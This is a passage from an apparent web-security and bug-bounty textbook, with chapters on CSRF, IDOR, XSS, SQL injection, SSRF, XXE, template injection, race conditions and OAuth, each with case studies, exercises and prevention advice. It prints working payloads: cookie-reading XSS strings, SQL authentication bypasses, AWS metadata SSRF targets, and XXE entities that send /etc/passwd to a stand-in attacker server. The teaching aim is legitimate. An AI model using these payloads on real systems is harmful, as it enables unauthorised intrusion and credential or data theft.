1. Locate a state-changing request (POST, PUT, DELETE, or a data-altering GET).
2. In Burp, right-click the request and select **Engagement tools → Generate CSRF PoC**.
3. Remove or tamper with any CSRF token and resend to check whether the server still accepts the request.
4. For JSON endpoints, attempt the content-type switch described above.
5. Serve the generated HTML PoC and confirm the forged action actually executes while authenticated as a test account.

### Table 7.1 — CSRF Defenses and How to Test Them

| Defense | Mechanism | Test |
|---|---|---|
| CSRF token | Unique per-user, per-request value | Remove the token, or reuse another user's token |
| CORS preflight | Blocks untrusted cross-origin JSON POSTs | Switch content-type to skip the preflight |
| Origin/Referer check | Verifies request origin | Strip the header, or test substring-match acceptance |
| SameSite cookies | Withholds cookies cross-site | `lax` still allows GET-based CSRF via top-level navigation |

### Automation
Burp's built-in CSRF PoC generator handles the majority of manual PoC-building work; no dedicated automated scanner reliably replaces manual confirmation for this class.

### False Positives
Read-only GET requests are never CSRF-vulnerable, since nothing changes as a result. The mere presence of a CSRF token is not proof of protection — its validation must be tested directly.

### Verification
Confirm the forged request succeeds from a genuinely cross-origin context (a separate HTML file, not the application's own domain) while authenticated as a victim account.

### Reporting
Severity should scale with the sensitivity of the forged action — email or password changes carry account-takeover potential and deserve to be framed accordingly, distinct from a low-impact UI preference toggle.

### Prevention
Correctly implemented, session-bound CSRF tokens validated on every state-changing request, combined with strict `SameSite=Strict` or `Lax` cookies and proper Origin verification.

### Key Takeaways
CSRF abuses automatic cookie attachment to forge authenticated requests. GET-based CSRF requires only an image tag; POST-based CSRF requires a hidden auto-submitting form. Content-type switching remains a common, effective bypass against CORS-based JSON protections.

### Cheat Sheet
```
GET CSRF:   <img src="https://target.com/action?param=value">
POST CSRF:  hidden auto-submit <form> + script submit()
Bypass:     Content-Type → x-www-form-urlencoded / multipart/form-data / text/plain
Test token: remove it / reuse an old one / use another user's token
```

### Exercises
1. **(Foundational)** Use Burp's CSRF PoC generator against a lab request and trigger it from a separate HTML file.
2. **(Intermediate)** Test a JSON-based endpoint for content-type-switch CORS bypass.
3. **(Advanced)** Identify a sensitive state-changing action in a test application and produce a full mock report chaining it into an account-takeover scenario.

### Practice Labs
- PortSwigger Web Security Academy: "CSRF vulnerability with no defenses"; "CSRF where token validation depends on request method"; "CSRF where token is not tied to the user session"

### Review Questions
1. Why does a preflight request block some CSRF attacks but not others?
2. What two things should be tested before ruling out a CSRF token as an effective defense?
3. Why might a `SameSite=Lax` cookie still permit a GET-based CSRF attack?

### References
- OWASP CSRF Prevention Cheat Sheet
- PayloadsAllTheThings — CSRF

## Chapter 8 — Insecure Direct Object References (IDOR)

### Learning Objectives
- Apply the two-account testing methodology systematically
- Recognize and bypass common ID-obfuscation techniques
- Identify blind IDORs that leak data outside the immediate HTTP response

### Definition
An IDOR exists when an application grants direct access to a resource based on a user-supplied reference — an ID, filename, or key — without verifying the requester is actually authorized to access that specific resource.

### Root Cause
```
Your request:    GET /messages?user_id=1234   → your own messages
Tampered:        GET /messages?user_id=1233   → someone else's messages

Vulnerable logic:
    messages = load_messages(request.user_id)   ← trusts the supplied ID directly

Correct logic:
    if request.user_id != session.logged_in_user_id: reject
    messages = load_messages(request.user_id)
```

IDORs are not limited to reads — a write-based IDOR against a `/change_password` endpoint accepting an unvalidated `user_id` parameter allows overwriting any account's password. They are also not limited to database rows: predictable file-naming patterns (`user1234-01.jpeg`) can expose another user's uploaded files directly.

### Discovery Process: The Two-Account Methodology
1. Create two accounts at every distinct privilege level the application offers.
2. Map every feature using the higher-privileged account, focusing on anything returning or modifying user-specific data.
3. Capture every request in Burp, logging in as each account in a separate browser.
4. Swap the IDs between requests captured from each account and observe whether cross-account access succeeds.

### Table 8.1 — Bypassing Common IDOR Protections

| Protection | Bypass technique |
|---|---|
| Encoded/hashed IDs | Decode with Burp's Smart Decode — many "random" strings are simply base64 |
| Low-entropy generated IDs | Create several accounts consecutively and compare for a discoverable pattern |
| IDs leaked elsewhere | Cross-reference recon data for a separate endpoint that exposes the full ID |
| Cookie-only endpoints | Append an ID parameter anyway; legacy code paths sometimes still honor it |
| Blind IDOR | Check email receipts, exports, and notifications, not just the HTTP response |
| Method restrictions | Test GET, POST, PUT, DELETE, PATCH on the same route independently |
| Extension-based routing | Append `.json` to the endpoint |

### Manual Testing / Burp Workflow
Systematically apply the bypass matrix above to every endpoint referencing a user-specific object, logging every result — positive or negative — for future reference.

### Automation
Burp's Autorize extension automatically replays requests under a lower-privileged session to flag likely access-control failures; Intruder can iterate a numeric ID parameter across a defined range.

### False Positives
Publicly accessible resources returning identical data to any user by design are not vulnerabilities. An ID parameter existing is not itself evidence of a flaw if session identity is correctly cross-checked against it.

### Verification
Confirm cross-account access using two genuinely distinct, authenticated sessions, and document the exact request and response demonstrating unauthorized access.

### Reporting
Title reports specifically — "IDOR on `/change_password` leads to account takeover" rather than a vague generic title — and clearly identify which account is attacker and which is victim in the proof of concept, along with the resulting state change.

### Prevention
Every request handling a user-referenced resource must independently verify that the authenticated session is authorized for that specific object, regardless of how obscured the reference identifier appears.

### Key Takeaways
IDOR is fundamentally a missing authorization check on a directly referenced resource. Obfuscated IDs are not a substitute for access-control verification. Prioritize testing on password/account-recovery and financial endpoints for the highest-impact write-based findings.

### Cheat Sheet
```
Test matrix per endpoint:
  [ ] swap numeric ID directly
  [ ] decode "random" ID before swapping
  [ ] check for ID leaks on other endpoints
  [ ] add ?user_id=X to cookie-only requests
  [ ] try GET/POST/PUT/DELETE/PATCH on the same route
  [ ] append .json to the URL
  [ ] check email/export outputs, not just the HTTP response
```

### Exercises
1. **(Foundational)** Create two test accounts and manually test three features using the two-account methodology.
2. **(Intermediate)** Decode a base64-looking ID and confirm whether it is simply an encoded sequential value.
3. **(Advanced)** Identify and document a blind IDOR that surfaces data via an email or export rather than the direct HTTP response.

### Practice Labs
- PortSwigger Web Security Academy: "Insecure direct object references"; "User ID controlled by request parameter, with unpredictable user IDs"; "Method-based access control can be circumvented"

### Review Questions
1. Why is "the ID looks random" insufficient evidence that an endpoint is safe?
2. What is a blind IDOR, and why is it easy to overlook?
3. Why should password-reset and financial endpoints be prioritized when hunting for write-based IDORs?

### References
- PayloadsAllTheThings — Insecure Direct Object References
- OWASP Access Control Cheat Sheet

## Chapter 9 — Cross-Site Scripting (XSS)

### Learning Objectives
- Identify injection context before crafting a payload
- Distinguish reflected, stored, DOM-based, blind, and self-XSS
- Recognize how self-XSS can be escalated through chaining

### Definition
XSS occurs when an application renders user-controlled input into a page without proper sanitization or encoding, allowing an attacker's script to execute in another user's browser within the security context of the vulnerable site.

### Root Cause and Injection Context

**HTML-attribute context:**
```html
<!-- Original -->
<input type="text" name="username" value="hacker">

<!-- Payload: hacker" onfocus=alert(document.cookie) autofocus " -->
<input type="text" name="username" value="hacker" onfocus=alert(document.cookie) autofocus "" width=50px>
```

**JavaScript-string context:**
```html
<!-- Original -->
<script>var name = 'hacker';</script>

<!-- Payload: hacker';alert(document.cookie);'' -->
<script>var name = 'hacker';alert(document.cookie);'';</script>
```

**Case Study — Shopify Wholesale ($500).** Angle brackets were HTML-encoded, but the input was reflected raw inside an existing `<script>` block. The working payload never used angle brackets at all — a pure JavaScript-string breakout (`test';alert('XSS');'`) succeeded where a conventional `<script>` tag payload would have failed. Always inspect `view-source` to determine exact injection context before selecting a payload.

### Table 9.1 — XSS Variants

| Type | Mechanism | Notes |
|---|---|---|
| Reflected | Payload in the request, executes immediately | Requires the victim to click a crafted link |
| Stored | Payload persisted server-side | Executes for every user who later views the data |
| DOM-based | Client-side JavaScript writes untrusted data unsafely into the page | The server may never see the payload at all |
| Blind | Stored payload executing somewhere the tester cannot observe | Requires out-of-band tooling (e.g., XSSHunter) |
| Self | Affects only the submitting user's own session | Low value alone, but chainable with CSRF |

**DOM-based example:** `document.getElementById('name').innerHTML = location.hash.split('#')[1]` with no sanitization allows `site.com/hi#<img src=x onerror=alert(document.domain)>` to execute purely client-side.

**Case Study — Uber Login/Logout CSRF chained with Self-XSS.** A stored self-XSS payload, normally low value, was escalated by using a login/logout CSRF to force a victim into the attacker's own session, where the payload then executed against them.

**Case Study — Shopify Currency Formatting ($1,000).** The payload did not fire where it was submitted; it executed later, when a different administrator viewed a separate page where the same field's value was re-rendered — a reminder to check every location data might later be displayed, not only the immediate response.

### Manual Testing / Burp Workflow
1. Submit a unique, harmless canary string in every reflection point.
2. Use `view-source` to determine the exact injection context.
3. Craft a payload matching that specific context.
4. For stored XSS, check every role and page that might display the data later, including admin views and exports.
5. For DOM XSS, review the page's JavaScript for `innerHTML`, `document.write`, `eval`, and `location.hash` usage.
6. For blind XSS, plant an out-of-band payload in every input field reachable, including ones with no visible immediate effect.

### Automation
Automated tools (Dalfox, XSStrike) can surface reflection candidates at scale but reliably produce false positives; always confirm actual execution manually. Blind XSS payloads should be planted broadly and left to "cook," with periodic dashboard checks.

### False Positives
Reflection without execution — where special characters are correctly HTML-encoded — is not exploitable.

### Verification
Confirm actual JavaScript execution (an `alert()` firing, or a DOM state change) rather than mere string reflection.

### Reporting
State the exact type, injection point, working payload, and concrete impact (session/cookie theft, forced actions, account takeover). Stored XSS reaching an admin-visible location deserves explicit escalation language.

### Prevention
Context-aware output encoding at the point of rendering, combined with a properly configured Content-Security-Policy, remains the most robust defense against this class.

### Key Takeaways
XSS requires matching the payload to its exact injection context — HTML, attribute, or JavaScript string. Stored XSS is generally more severe than reflected. Self-XSS becomes valuable only when chained, most commonly with CSRF.

### Cheat Sheet
```
Canary test:      zzXSStestzz123 → view-source to find injection context
HTML context:     "><script>alert(document.domain)</script>
Attribute context: " onfocus=alert(document.cookie) autofocus "
JS-string context: ';alert(document.cookie);'
DOM sink check:    grep JS for innerHTML, document.write, eval, location.hash
```

### Exercises
1. **(Foundational)** Find and exploit a reflected XSS in a lab environment, confirming exact injection context first.
2. **(Intermediate)** Exploit a DOM-based XSS driven by `location.hash` or a similar client-side sink.
3. **(Advanced)** Set up an out-of-band blind XSS payload and confirm successful callback from a test application.

### Practice Labs
- PortSwigger Web Security Academy: "Reflected XSS into HTML context with nothing encoded"; "Stored XSS into HTML context with nothing encoded"; "DOM XSS in document.write sink using source location.search"

### Review Questions
1. Why did the Shopify Wholesale payload need to avoid angle brackets entirely?
2. Why is stored XSS generally considered more severe than reflected XSS?
3. What turns a low-value self-XSS into a reportable finding?

### References
- OWASP XSS Prevention Cheat Sheet
- PayloadsAllTheThings — XSS Injection

## Chapter 10 — SQL Injection

### Learning Objectives
- Construct classic authentication-bypass SQL injection payloads
- Apply boolean-based and time-based blind extraction techniques
- Understand why prepared statements are a complete remediation

### Definition
SQL injection occurs when user input is concatenated directly into a database query rather than treated as parameterized data, allowing an attacker to alter the query's logic or structure.

### Root Cause
```php
$name = $_GET['name'];
$query = "SELECT * FROM users WHERE name = '$name'";
```

Submitting `test' OR 1='1` as `name` transforms the query into one whose `WHERE` clause matches every row:
```sql
SELECT * FROM users WHERE name = 'test' OR 1='1'
```

Where a second condition (such as a password check) also applies, appending a comment sequence neutralizes the remainder of the query:
```
test' OR 1='1;--
```
```sql
SELECT * FROM users WHERE name = 'test' OR 1='1'; -- AND password = '12345'
```

### Real-World Impact and Case Studies

**Boolean-based blind — Yahoo! Sports ($3,705).** A `year` parameter's response changed observably when a conditional statement evaluated true versus false, confirming injection without any visible query output:
```
(2010)and(if(mid(version(),1,1))='5',true,false))--
```
Iterating this character-by-character across a target string enables full data extraction purely from a true/false signal.

**Time-based blind — Uber ($4,000).** With no visible response difference at all, a `sleep()` payload embedded in a JSON body parameter proved injection through response timing alone:
```json
{"user_id": "5755 and sleep(12)=1", "receiver": "..."}
```
Extraction proceeded by testing each character position against a sleep-conditional payload and measuring elapsed time.

### Table 10.1 — Confirmation Techniques

| Technique | Signal |
|---|---|
| In-band | Query results directly visible in the response |
| Boolean-blind | Response content/behavior differs between true and false conditions |
| Time-blind | Response timing differs when a `sleep()` condition evaluates true |

### Manual Testing / Burp Workflow
1. Test every parameter that plausibly reaches a database query, including values inside JSON bodies and encoded blobs.
2. Submit a single quote first and look for a SQL error or broken response.
3. Attempt the classic bypass (`' OR 1='1'--`).
4. If no visible difference appears, test boolean-blind pairs and diff the responses using Burp Comparer.
5. If still no difference, test time-blind payloads and measure response latency.
6. Once confirmed manually, automate extraction with sqlmap.

### Automation
```bash
sqlmap -u "URL" --data="body" -p paramname --batch
```
Manual confirmation before automation avoids noisy, imprecise traffic against a live target.

### False Positives
A generic 500 error from a single quote does not alone prove injection; confirm with a genuine true/false comparison. Timing anomalies should be repeated multiple times to rule out network jitter.

### Verification
Reproduce the boolean or time-based signal consistently across repeated tests before escalating to extraction.

### Reporting
Demonstrate confirmed injection through a boolean or time-based proof, or limited, non-sensitive data extraction (version string, table names) — extracting only what is necessary to prove impact, consistent with responsible testing practice.

### Prevention
Parameterized queries (prepared statements) eliminate this vulnerability class at the architectural level; input filtering alone is not a complete substitute.

### Key Takeaways
Classic SQLi is rare on modern, well-maintained frameworks using prepared statements by default, making legacy and custom-built applications the higher-probability targets. Blind techniques (boolean and time-based) remain essential skills even when no output is directly visible.

### Cheat Sheet
```
Test:            '
Auth bypass:     ' OR 1='1
Comment rest:    ' OR 1='1'--
Boolean-blind:   ' AND 1=1--  vs  ' AND 1=2--
Time-blind:      ' AND sleep(5)='0
Automate:        sqlmap -u "URL" -p param --batch
```

### Exercises
1. **(Foundational)** Perform a classic authentication-bypass injection against a deliberately vulnerable lab login form.
2. **(Intermediate)** Manually extract one character of data using the boolean-blind technique without sqlmap.
3. **(Advanced)** Confirm and extract data from a time-based blind injection point in a lab environment.

### Practice Labs
- PortSwigger Web Security Academy: "SQL injection vulnerability in WHERE clause allowing retrieval of hidden data"; "Blind SQL injection with conditional responses"; "Blind SQL injection with time delays"

### Review Questions
1. Why does appending `--` neutralize the remainder of an injected query?
2. What is the practical difference between boolean-blind and time-blind SQL injection?
3. Why are prepared statements considered a complete fix rather than a partial mitigation?

### References
- OWASP SQL Injection Prevention Cheat Sheet
- `sqlmapproject/sqlmap`

## Chapter 11 — Server-Side Request Forgery (SSRF)

### Learning Objectives
- Recognize SSRF-candidate features during reconnaissance and testing
- Escalate confirmed SSRF toward internal-network and cloud-metadata access
- Detect and exploit blind SSRF using out-of-band techniques

### Definition
SSRF allows an attacker to make a server perform unintended network requests on the attacker's behalf, conceptually the server-side counterpart of CSRF.

### Root Cause
```
                  Public Internet          Internal Network (normally unreachable)
                        │                          │
   Attacker ──(SSRF payload)──► App Server ──(forges request)──► Database server
                                                              Internal admin panel
                                                              Cloud metadata service
```

### Escalation Tiers

1. **Internal infrastructure access** — reaching database or admin services normally firewalled from the public internet.
2. **Cloud metadata endpoints** — on AWS, `http://169.254.169.254/latest/meta-data/` is reachable only from the hosting server itself and can expose IAM security credentials via `/latest/meta-data/iam/security-credentials/`.
3. **Redirect chaining** — hosting a URL that issues a `301`/`302` to an internal IP, converting an externally restricted SSRF into an internal one if the server follows redirects.
4. **Blacklist bypass** — registering a domain that satisfies a naive "ends with allowed domain" check while remaining fully attacker-controlled.

### Case Study — ESEA ($1,000)
Google dorking (`site:play.esea.net ext:php`) surfaced a `media_preview.php?url=` parameter. Direct SSRF payloads were blocked by an image-format validation check, but converting the path into a query parameter (`http://ziot.org?1.png` instead of `http://ziot.org/1.png`) satisfied the check while giving the researcher full control of the fetched content. The researcher then escalated to requesting the AWS metadata endpoint directly, confirming access to internal server information — illustrating that a confirmed SSRF should always be escalated toward metadata or internal-network access before reporting.

### Blind SSRF
When no response is visible, two out-of-band techniques apply:
- **Timing-based port scanning** — measuring response latency against internal `IP:port` combinations to infer open, closed, or filtered status.
- **DNS-based exfiltration** — triggering a DNS lookup to an attacker-controlled domain, encoding command output (base32, since URLs are alphanumeric) as a subdomain label, and reading it from server logs.

### Manual Testing / Burp Workflow
1. Flag every parameter accepting a URL, hostname, or IP (`url=`, `path=`, `dest=`, `webhook=`, `callback=`).
2. Point the parameter at Burp Collaborator and confirm the request arrives.
3. Escalate toward cloud metadata IPs, internal ranges (`127.0.0.1`, `10.x.x.x`, `192.168.x.x`), and internally guessed hostnames.
4. If filtered, attempt encoding tricks, `@`-based confusion, redirect chaining, and DNS rebinding.
5. For no visible response, confirm via Collaborator's DNS/HTTP interaction log.

### Automation
`SSRFmap` automates several bypass techniques once a candidate parameter is identified, though manual confirmation with Collaborator remains the most reliable first step.

### False Positives
A feature intentionally designed to fetch external content, with no demonstrated internal-network or metadata reachability, is not itself a vulnerability.

### Verification
Confirm the interaction via Collaborator or a controlled external server log, and — where possible — demonstrate reachability of a genuinely internal or metadata resource.

### Reporting
Always report the highest-impact escalation achieved. "SSRF allows access to AWS instance metadata, exposing IAM credentials" is dramatically stronger, and typically pays more, than "the application fetches arbitrary external URLs."

### Prevention
Strict allowlisting of permitted destination hosts, combined with network-level segmentation preventing application servers from reaching sensitive internal services or cloud metadata endpoints unless explicitly required.

### Key Takeaways
The value of an SSRF finding comes almost entirely from escalation — internal-network reachability or cloud metadata credential theft — rather than the initial confirmation. Blind SSRF still yields real information through timing or DNS-based out-of-band techniques.

### Cheat Sheet
```
Look for params:   url=, path=, dest=, image=, webhook=, callback=, redirect=
Confirm SSRF:      point param at Burp Collaborator, check for interaction
Escalate to:       169.254.169.254/latest/meta-data/ (AWS)
                   metadata.google.internal (GCP)
                   127.0.0.1, 10.x.x.x, 192.168.x.x
```

### Exercises
1. **(Foundational)** Confirm a basic SSRF against a local server in a lab environment.
2. **(Intermediate)** Set up Burp Collaborator and confirm a blind SSRF that produces no visible response.
3. **(Advanced)** Practice the full AWS metadata escalation path end-to-end in a lab environment.

### Practice Labs
- PortSwigger Web Security Academy: "Basic SSRF against the local server"; "Blind SSRF with out-of-band detection"; "SSRF with whitelist-based input filter"

### Review Questions
1. Why did converting `/1.png` into `?1.png` change the ESEA application's fetch behavior?
2. Why is AWS metadata access considered such high-value SSRF impact?
3. How does DNS-based exfiltration confirm a blind SSRF where no direct response is visible?

### References
- Orange Tsai, "A New Era of SSRF" (Black Hat 2017)
- PayloadsAllTheThings — Server Side Request Forgery

## Chapter 12 — XML External Entity Injection (XXE)

### Learning Objectives
- Understand XML entity resolution and how it can be weaponized
- Construct both direct and out-of-band blind XXE payloads
- Recognize non-obvious XML-based attack surfaces (SVG, Office documents)

### Definition
XXE exploits an XML parser's willingness to process attacker-supplied Document Type Definitions (DTDs), allowing an entity to be defined that fetches local files or remote URLs and embeds the result into the parsed output.

### Root Cause
```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [
  <!ELEMENT foo ANY >
  <!ENTITY xxe SYSTEM "file:///etc/passwd" >
]>
<foo>&xxe;</foo>
```
The parser resolves `&xxe;` by fetching the referenced file and inserting its contents wherever the entity is referenced.

### Blind XXE
When results are not reflected directly, out-of-band exfiltration chains two entities:
```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [
  <!ELEMENT foo ANY >
  <!ENTITY % xxe SYSTEM "file:///etc/passwd" >
  <!ENTITY callhome SYSTEM "http://attacker-server/?%xxe;">
]>
<foo>&callhome;</foo>
```
The `%`-parameter entity is required specifically because it is evaluated within the DTD itself; file contents surface as query-string data on an incoming request to attacker-controlled infrastructure — functionally identical to blind SSRF's out-of-band pattern.

### Case Study — Google Toolbar Gallery ($10,000)
Developers could upload XML files describing custom toolbar buttons, parsed server-side to generate search-result descriptions. Because the parser processed attacker-supplied DTDs without restriction, a malicious external entity in an uploaded file gave read access to Google's own production servers.

### Discovery Process
Any file upload accepting `.xml`, `.svg`, `.docx`, `.xlsx`, or `.pptx` is worth testing, since these Office formats are internally ZIP archives of XML. SOAP API endpoints and RSS/Atom parsers are similarly candidate surfaces.

### Manual Testing / Burp Workflow
1. Submit the basic file-read payload and check whether the response reflects file contents.
2. If nothing reflects, switch to the out-of-band variant using Burp Collaborator as the callback server.
3. If direct `file://` access is blocked, try alternate protocol handlers depending on the fingerprinted backend.
4. For file-format-based XXE, unzip the container format, inject the entity into the internal XML, and re-upload.

### False Positives
An application that strictly rejects any DTD declaration is not vulnerable — confirm the DTD is actually being processed rather than merely that the file uploads successfully.

### Verification
Confirm either reflected file contents (using the harmless `/etc/passwd` proof file) or a logged Collaborator interaction for blind cases.

### Reporting
Present the reflected file contents or the out-of-band interaction log, and frame impact around what is reachable — local file disclosure, internal network access (XXE can perform SSRF-like internal probing), or potential denial of service.

### Prevention
Disable external entity and DTD processing entirely at the XML parser configuration level — the correct fix for essentially all modern XML libraries.

### Key Takeaways
XXE requires attacker control over DTD processing. Blind exfiltration follows the same "make it call home" principle as blind SSRF. File uploads in SVG and Office formats are frequently overlooked XML attack surfaces.

### Cheat Sheet
```xml
Basic:
<!DOCTYPE foo [ <!ELEMENT foo ANY >
<!ENTITY xxe SYSTEM "file:///etc/passwd" > ]>
<foo>&xxe;</foo>

Blind (OOB):
<!DOCTYPE foo [ <!ELEMENT foo ANY >
<!ENTITY % xxe SYSTEM "file:///etc/passwd" >
<!ENTITY callhome SYSTEM "http://YOURSERVER/?%xxe;"> ]>
<foo>&callhome;</foo>
```

### Exercises
1. **(Foundational)** Perform a basic file-read XXE against a deliberately vulnerable lab endpoint.
2. **(Intermediate)** Confirm a blind XXE using Burp Collaborator as the out-of-band listener.
3. **(Advanced)** Unzip a `.docx` file, inject an entity into its internal XML, and test the modified file against a lab upload feature.

### Practice Labs
- PortSwigger Web Security Academy: "Exploiting XXE using external entities to retrieve files"; "Blind XXE with out-of-band interaction"; "Exploiting XXE via image file upload"

### Review Questions
1. Why does `SYSTEM "file:///etc/passwd"` allow an entity to read arbitrary server files?
2. Why is a `%`-parameter entity required for out-of-band exfiltration rather than a standard `&` entity?
3. Why are SVG and Office document uploads worth testing even without an obvious "XML" input field?

### References
- OWASP XML External Entity (XXE) Prevention Cheat Sheet
- PayloadsAllTheThings — XXE Injection

## Chapter 13 — Server-Side Template Injection (SSTI)

### Learning Objectives
- Fingerprint a template engine and select the correct test payload
- Recognize that SSTI often surfaces in a different rendering location than the input point
- Distinguish server-side from client-side template injection

### Definition
SSTI occurs when a template engine evaluates user input as executable template syntax rather than treating it as inert data, potentially escalating to remote code execution depending on the engine.

### Root Cause
```
Normal template:    Hello, {{ user.name }}!         → "Hello, Aryan!"
Injected input:      {{7*7}}   as the name value    → "Hello, 49!"
```

### Table 13.1 — Engine-Specific Test Payloads

| Engine | Language | Test payload |
|---|---|---|
| Jinja2 | Python/Flask | `{{7*7}}` then `{% for c in [1,2,3]%}{{c}}{% endfor %}` |
| ERB | Ruby/Rails | `<%= 7*7 %>` |
| Smarty / Twig | PHP | `{{7*7}}` |
| Liquid | Shopify | Deliberately restricted; limited exploitation surface by design |
| AngularJS (client-side) | JavaScript | `{{7*7}}` — CSTI, not SSTI |

### Case Study — Uber Flask/Jinja2 SSTI ($10,000)
Uber's own disclosed tech-stack information revealed that a rider-facing subdomain (Node.js/Express) sent profile-change notification emails rendered by a *different* Flask/Jinja2-based subdomain. Setting the profile name to `{{1+1}}` produced `2` in the resulting email, confirming template evaluation. Confirmation was escalated using a for-loop expression to prove arbitrary logic execution — and the researcher stopped at proof-of-concept, requesting permission before any further exploitation.

### Case Study — Uber AngularJS CSTI ($3,000)
A reflected URL parameter rendered inside an AngularJS-built page. `q=wrtz{{7*7}}` rendered as `wrtz49`, confirming client-side template injection; a published Sandbox-escape payload (relevant to pre-1.6 AngularJS versions) turned the confirmation into a working XSS.

### Related — Rails Dynamic Render (CVE-2016-0752)
User-controlled filenames resolved as Rails template paths, enabling path traversal to arbitrary files or, where inline ERB rendering was reached, direct code execution.

### Discovery Process
Fingerprint the technology stack before testing, then submit a math expression wherever input is reflected — anywhere, including delayed rendering locations such as email notifications and exports.

### Manual Testing / Burp Workflow
1. Fingerprint the engine (Wappalyzer, view-source framework tells).
2. Submit a matching math-expression payload.
3. Confirm evaluation (`49` rendered) rather than literal reflection (`{{7*7}}` unchanged).
4. Escalate confirmation with a loop or conditional expression to prove logic execution, not just arithmetic.
5. Check every downstream rendering location, not only the immediate response.

### False Positives
Literal reflection of the payload — the braces appearing unchanged — indicates the engine is not evaluating the input as template syntax.

### Verification
Confirm genuine expression evaluation across at least two distinct payload complexities (arithmetic and a loop/conditional) before reporting.

### Reporting
Demonstrate proof of execution capability without pursuing further exploitation (file access, code execution) absent explicit permission from the program.

### Prevention
Never render user-supplied strings directly through a template engine's evaluation path; use logic-less templating or sandboxed rendering contexts strictly.

### Key Takeaways
SSTI testing requires fingerprinting the engine first to select correct syntax. Confirmed SSTI often surfaces at a rendering location entirely separate from the input point. Responsible disclosure means demonstrating capability, not maximum exploitation.

### Cheat Sheet
```
Fingerprint engine first (Wappalyzer/view-source)
Test payloads:
  Jinja2:    {{7*7}}   then {% for c in [1,2,3]%}{{c}}{% endfor %}
  ERB:       <%= 7*7 %>
  AngularJS: {{7*7}}   (check angular.version for Sandbox status)
```

### Exercises
1. **(Foundational)** Confirm SSTI on a Jinja2/Flask lab target using a math expression.
2. **(Intermediate)** Escalate confirmation with a for-loop expression to prove logic execution.
3. **(Advanced)** Identify a feature where input is submitted in one location but potentially rendered elsewhere (e.g., an email), and test both locations independently.

### Practice Labs
- PortSwigger Web Security Academy: "Basic server-side template injection"; "Server-side template injection using documentation"; "Server-side template injection with information disclosure via user-supplied objects"

### Review Questions
1. Why does `{{7*7}}` rendering as `49` prove more than plain reflection testing does?
2. Why did the Uber Jinja2 finding require checking a subdomain different from the one the payload was submitted on?
3. Why is stopping at proof-of-concept considered best practice for SSTI findings?

### References
- nVisium — Server-Side Template Injection Blog Series
- `epinna/tplmap`

## Chapter 14 — Race Conditions

### Learning Objectives
- Explain the time-of-check to time-of-use (TOCTOU) failure pattern
- Design a valid test case that isolates a real race condition from a false negative
- Apply simultaneous-request techniques using both curl and Turbo Intruder

### Definition
A race condition occurs when concurrent operations execute in an order the developer did not anticipate, becoming a security vulnerability specifically when a sensitive action executes before a security check has fully completed.

### Root Cause
```
Thread 1: check balance ($500 — OK)
Thread 2: check balance ($500 — OK)     ← both checks pass BEFORE either deduction happens
Thread 1: add $500 to destination
Thread 2: add $500 to destination        ← destination now has $1000
Thread 1: deduct $500 from source
Thread 2: deduct $500 from source        ← source now has $0

Result: $1000 created from a single $500 balance.
```
The identical pattern applies to online voting, gift-card redemption, coupon codes, and social engagement counters — any "should only happen once" action gated by a prior check.

### Discovery Process
Target features involving numbers that should not be exploitable through repetition: transfers, redemptions, votes, in-game currency, and referral bonuses.

### Test Design (critical)
Select an amount or action that should succeed exactly once given the account's current state — not an amount that would fail even on a single legitimate attempt, and not one that would legitimately succeed repeatedly regardless of any race condition.

### Manual Testing / Burp Workflow
```bash
curl (transfer request) & curl (transfer request) & curl (transfer request) &
```
Burp's Turbo Intruder extension, purpose-built for minimal-timing-gap request delivery, is more reliable than manual curl backgrounding for tight race windows.

### Automation
Turbo Intruder's included `race.py` template script provides a ready-made starting point for firing large batches of near-simultaneous requests.

### False Positives
A single failed attempt does not prove a feature is safe — race condition success depends partly on scheduling luck, and repeated attempts are often necessary before concluding a target is not exploitable.

### Verification
Confirm the exploited outcome is mathematically impossible under correct sequential processing — for example, a destination account receiving more value than a single request should have transferred.

### Reporting
Include explicit setup instructions (e.g., "create an account with $X balance"), the exact simultaneous-request technique used, the expected versus actual outcome, and a note that reproduction may require multiple attempts due to timing variability.

### Prevention
Resource locking (synchronization) around the check-and-use sequence, combined with the principle of least privilege limiting the blast radius of any single process even when a race succeeds.

### Key Takeaways
Race conditions exploit the gap between a security check and the action it gates. Test design must select an amount/action that should succeed exactly once. Success depends partly on timing luck — retry before concluding a target is safe.

### Cheat Sheet
```bash
curl (request) & curl (request) & curl (request) & curl (request)
# Preferred: Burp Turbo Intruder for tighter timing precision
```

### Exercises
1. **(Foundational)** Solve a basic race-condition lab using manual curl backgrounding.
2. **(Intermediate)** Repeat the same lab using Turbo Intruder and compare reliability.
3. **(Advanced)** Draft a full mock report for a race condition on a financial action, including explicit retry guidance.

### Practice Labs
- PortSwigger Web Security Academy: "Limit overrun race conditions"; "Multi-endpoint race conditions"; "Bypassing rate limits via race conditions"

### Review Questions
1. Why does firing two identical-value transfers simultaneously test for a race condition, while firing an over-limit amount does not?
2. Why is a single failed attempt insufficient evidence that a feature is safe from race conditions?
3. What does "time-of-check to time-of-use" mean precisely?

### References
- PortSwigger — Turbo Intruder documentation
- PayloadsAllTheThings — Race Condition

## Chapter 15 — JWT, OAuth, and Broken Authentication

### Learning Objectives
- Map the OAuth authorization-code flow and identify its highest-risk parameters
- Apply JWT forgery techniques including algorithm confusion
- Recognize username-enumeration, session-fixation, and reset-token weaknesses

### The OAuth Flow

```
Resource Owner (user) → Client (third-party app) → Resource Server (Google/GitHub/etc.)

1. User clicks "Login with Provider"
2. Client redirects to Provider with client_id, redirect_uri, response_type, scope, state
3. Provider shows a consent screen
4. User approves → Provider redirects back to redirect_uri with a code/token + state
5. Client exchanges the code for an access token
```

`redirect_uri` is the most commonly misconfigured parameter; `state` prevents CSRF against the flow itself; `scope` bounds what a stolen token can access.

### Case Study — Slack redirect_uri Bypass ($100)
Slack validated `redirect_uri` using a prefix match rather than an exact match, so `https://example.com.attacker.com` passed validation for a whitelisted `https://example.com`. An `<img>` tag pointed at the crafted authorization URL sent the victim's OAuth token directly to the attacker's server — the identical DNS-rightmost-label pattern documented in Chapter 6.

### Table 15.1 — redirect_uri Bypass Techniques

```
Whitelisted: https://example.com
Try:
  https://example.com.attacker.com   (suffix bypass — prefix-only match)
  https://attacker.com?redirect=example.com
  https://example.com@attacker.com   (@ confusion)
```

### Case Study — Custom OAuth Implementation Flaw
